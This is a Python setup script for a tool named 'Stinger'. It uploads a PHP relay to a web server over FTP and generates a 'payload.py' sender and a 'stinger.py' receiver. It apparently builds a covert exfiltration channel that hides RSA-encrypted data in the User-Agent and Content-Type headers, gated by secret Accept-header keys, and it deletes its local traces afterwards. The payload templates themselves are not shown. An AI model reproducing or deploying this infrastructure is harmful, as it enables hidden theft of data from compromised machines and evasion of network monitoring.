# Setup Stinger

# Libraries
import ftplib, argparse, os, requests, rsa
from jinja2 import Environment, FileSystemLoader

# Initialization
parser = argparse.ArgumentParser()

# Website Arguments
parser.add_argument("-site", help="Website Address", required=True)
parser.add_argument("-ssl", help="Site SSL Encryption Set", required=False, default=True)

# FTP Arguments
parser.add_argument("-ftp", "--ftpServer", help="FTP Server Address", required=True)
parser.add_argument("-ftpu", "--ftpUser", help="FTP Username", required=True)
parser.add_argument("-ftpp", "--ftpPass", help="FTP Password", required=True)
parser.add_argument("-port", help="FTP Port", required=False, type=int, default=21)
parser.add_argument("-path", help="FTP Path", required=False)

# MySQL Arguments
parser.add_argument("-sqlh", "--sqlHost", help="MySQL Host", required=True)
parser.add_argument("-sqlu", "--sqlUser", help="MySQL Username", required=True)
parser.add_argument("-sqlp", "--sqlPass", help="MySQL Password", required=True)
parser.add_argument("-sqln", "--sqlName", help="MySQL Name", required=True)
 
# Read arguments from command line
args = parser.parse_args()

try:
    # Print Banner
    print(''' 
  ____  _   _                       
 / ___|| |_(_)_ __   __ _  ___ _ __ 
 \___ \| __| | '_ \ / _` |/ _ \ '__|
  ___) | |_| | | | | (_| |  __/ |   
 |____/ \__|_|_| |_|\__, |\___|_|   
                    |___/            ''')
    
    print("Starting Stinger Setup...")
    # FTP Connection
    ftpServer = ftplib.FTP()
    ftpServer.connect(args.ftpServer, args.port)
    ftpServer.login(args.ftpUser, args.ftpPass)
    print("Successfully connected to FTP Server")
    if args.path:
        ftpServer.cwd(args.path)
        
    # Generate data
    table = os.urandom(16).hex()
    tableID = os.urandom(16).hex()
    tableRNG = int(str(os.urandom(6).hex()), 16)
    armageddonKey = os.urandom(16).hex()
    postKey = os.urandom(16).hex()
    getKey = os.urandom(16).hex()
    (publicKey, privateKey) = rsa.newkeys(1024)
    
    # Variables 
    getKey = "key/" + getKey;
    postKey = "key/" + postKey;
    
    # Jinja2 Server Side File Creation
    env = Environment(
        loader=FileSystemLoader("./templates"),
    )
    
    # Create index.php
    indexTemplate = env.get_template("index.md")
    renderIndex = indexTemplate.render(postKey=postKey, getKey=getKey, table=table, tableRNG=tableRNG, 
                                       tableID=tableID, armageddonKey=armageddonKey)
    with open(f"index.php","w") as file:
        file.write(renderIndex)
    file.close()
    
    # Create config.php
    configTemplate = env.get_template("config.md")
    renderConfig = configTemplate.render(host=args.sqlHost, user=args.sqlUser, 
                                         password=args.sqlPass, database=args.sqlName)
    with open(f"config.php","w") as file:
        file.write(renderConfig)
    file.close()
    
    # Store files in FTP
    ftpServer.storbinary("STOR index.php", open(f"index.php", "rb"))
    ftpServer.storbinary("STOR config.php", open(f"config.php", "rb"))
    
    print("Successfully uploaded files to FTP Server")
    
    # Quit FPT Connection
    ftpServer.quit()
    
    # Test Stinger
    print("Testing Stinger...")
    
    # Testing random data
    testData = os.urandom(16).hex().encode()
    testDataEnc = rsa.encrypt(testData, publicKey).hex()
    postHeader = {"Accept": postKey, "User-Agent": testDataEnc}
    getHeader = {"Accept": getKey}
    
    # Check website argument format
    if((("http://www." in args.site and args.ssl.upper() == "FALSE"))
    or ("https://www." in args.site)):
        website = args.site
    elif("http://" in args.site and "www." not in args.site and args.ssl.upper() == "FALSE"):
        website = "http://www." + args.site.split("http://")[1]
    elif("https://" in args.site and "www." not in args.site and args.ssl.upper() == "TRUE"):
        website = "https://www." + args.site.split("https://")[1]
    elif("http://" not in args.site and "www." in args.site and args.ssl.upper() == "FALSE"):
        website = "http://www." + args.site.split("www.")[1]
    elif("https://" not in args.site and "www." in args.site and args.ssl.upper() == "TRUE"):
        website = "https://www." + args.site.split("www.")[1]
    elif("https://www." not in args.site and args.ssl.upper() == "TRUE"):
        website = "https://www." + args.site
    else:
        website = "http://www." + args.site

    request = requests.get(website)
    
    if(request.status_code == 200):
        print("Successfully connected to website")
        # Send Post Request
        request = requests.post(website, headers=postHeader) 
        # Check if post request was successful
        if(request.status_code == 200):
            print("Successfully sent POST request")
            # Send Get Request
            request = requests.get(website, params={tableID:tableRNG} ,headers=getHeader) 
            # Check if get request was sent successfully
            if(request.status_code == 200):
                print("Successfully sent GET request")
                # Get data and decrypt  
                requestData = request.headers.get("Content-Type")
                requestData = rsa.decrypt(bytes.fromhex(requestData), privateKey)
                #  Check if test passed
                if (requestData == testData):
                    print("Test successful")
                    
        # Fix this
        # print("Test failed") 
    else:
        print("Failed to connect to website")
    
    # Create Stinger
    print("Creating Stinger...")
    stingerTemplate = env.get_template("stinger.md")
    renderStinger = stingerTemplate.render(getKey=getKey, startingPoint=tableRNG , website=website, 
                                           tableID=tableID, armageddonKey=armageddonKey, 
                                           privateKey=privateKey)
    with open(f"stinger.py","w") as file:
        file.write(renderStinger)
    file.close()
    
    # Create Payload
    print("Creating Payload...")
    payloadTemplate = env.get_template("payload.md")
    renderPayload = payloadTemplate.render(postKey=postKey, website=website, publicKey=publicKey)
    with open(f"payload.py","w") as file:
        file.write(renderPayload)
    file.close()
    
    # Delete local files
    os.remove("index.php")
    os.remove("config.php")
    print("Successfully cleaned up files") 
    
except Exception as e:
    print("Error : " + str(e))
    exit(1)